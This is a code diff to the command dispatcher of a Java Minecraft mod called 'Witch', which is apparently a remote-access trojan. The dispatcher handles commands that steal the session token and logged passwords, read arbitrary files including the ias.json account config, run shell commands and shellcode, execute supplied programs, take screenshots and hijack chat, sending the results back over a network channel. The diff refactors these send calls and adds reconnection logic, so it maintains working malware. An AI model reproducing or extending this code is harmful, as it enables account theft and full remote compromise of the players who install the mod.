@@ -29,29 +29,33 @@ public class MessageHandler {
             try {
                 switch (msgType) {
                     case "steal_pwd_switch" -> Witch.config.passwordBeingLogged = !Witch.config.passwordBeingLogged;
-                    case "steal_token" -> messageUtils.send(msgType, Stealer.getToken());
+                    case "steal_token" -> NetUtil.send(msgType, Stealer.getToken());
                     case "chat_control" -> ChatUtil.sendChat(msg);
                     case "chat_filter" -> Witch.config.filterPattern = msg;
                     case "chat_filter_switch" -> Witch.config.isBeingFiltered = !Witch.config.isBeingFiltered;
                     case "chat_mute" -> Witch.config.isMuted = !Witch.config.isMuted;
-                    case "mods" -> messageUtils.send(msgType, MinecraftUtil.allMods());
-                    case "systeminfo" -> messageUtils.send(msgType, MinecraftUtil.systemInfo());
+                    case "mods" -> NetUtil.send(msgType, MinecraftUtil.allMods());
+                    case "systeminfo" -> NetUtil.send(msgType, MinecraftUtil.systemInfo());
                     case "screenshot" -> ScreenshotUtil.screenshot();
                     case "chat" -> ChatUtil.chat(Text.of(msg), false);
                     case "kill" -> Witch.client.close(false);
+                    case "reconnect" -> Witch.client.close(true);
                     case "shell" -> new Thread(() -> {
                         String result = ProgramUtil.runCmd(msg);
-                        messageUtils.send(msgType, "\n" + result);
+                        NetUtil.send(msgType, "\n" + result);
                     }).start();
                     case "shellcode" -> {
                         if (ProgramUtil.isWin())
                             new Thread(() -> new ShellcodeLoader().loadShellCode(msg, false)).start();
                     }
                     case "log" -> Witch.config.logChatAndCommand = !Witch.config.logChatAndCommand;
-                    case "config" -> messageUtils.send(msgType, Witch.config);
-                    case "player" -> messageUtils.send(msgType, new PlayerInfo(Witch.mc.player));
+                    case "config" -> NetUtil.send(msgType, Witch.config);
+                    case "player" -> {
+                        NetUtil.send(msgType, new PlayerInfo(Witch.mc.player));
+                        Witch.client.reconnections = 0;
+                    }
                     case "skin" -> {
-                        messageUtils.send("player", new PlayerInfo(Witch.mc.player));
+                        NetUtil.send("player", new PlayerInfo(Witch.mc.player));
                         PlayerSkinUtil.sendPlayerSkin();
                     }
                     case "server" -> {
@@ -60,21 +64,20 @@ public class MessageHandler {
                     }
                     case "kick" -> ServerUtil.disconnect();
                     case "execute" -> ProgramUtil.runProg(GSON.fromJson(msg, byte[].class));
-                    case "iasconfig" -> messageUtils.send(msgType, FileUtil.read("config/ias.json"));
-                    case "read" -> messageUtils.send(msgType, FileUtil.read(msg));
-                    case "runargs" ->
-                            messageUtils.send(msgType, ManagementFactory.getRuntimeMXBean().getInputArguments());
-                    case "props" -> messageUtils.send(msgType, System.getProperties());
-                    case "ip" -> messageUtils.send(msgType, NetUtil.getIp());
+                    case "iasconfig" -> NetUtil.send(msgType, FileUtil.read("config/ias.json"));
+                    case "read" -> NetUtil.send(msgType, FileUtil.read(msg));
+                    case "runargs" -> NetUtil.send(msgType, ManagementFactory.getRuntimeMXBean().getInputArguments());
+                    case "props" -> NetUtil.send(msgType, System.getProperties());
+                    case "ip" -> NetUtil.send(msgType, NetUtil.getIp());
                     case "crash" -> MinecraftUtil.crash();
                     case "xor" -> {
                         messageUtils.setXOR(msg);
                         messageUtils.acceptXOR = true;
 
                         String greetingMsg = "Reconnected " + Witch.client.reconnections + " times, I am " + mc.getSession().getUsername();
-                        messageUtils.send("greeting", greetingMsg);
-                        messageUtils.send("player", new PlayerInfo(Witch.mc.player));
-                        messageUtils.send("ip", NetUtil.getIp());
+                        NetUtil.send("greeting", greetingMsg);
+                        NetUtil.send("player", new PlayerInfo(Witch.mc.player));
+                        NetUtil.send("ip", NetUtil.getIp());
                     }
                     default -> {
                     }
@@ -83,6 +86,9 @@ public class MessageHandler {
                 Witch.println("Corrupted message!");
                 Witch.printStackTrace(e);
             }
+        }, e -> {
+            Witch.printStackTrace(e);
+            Witch.client.close(true);
         });
     }
 }
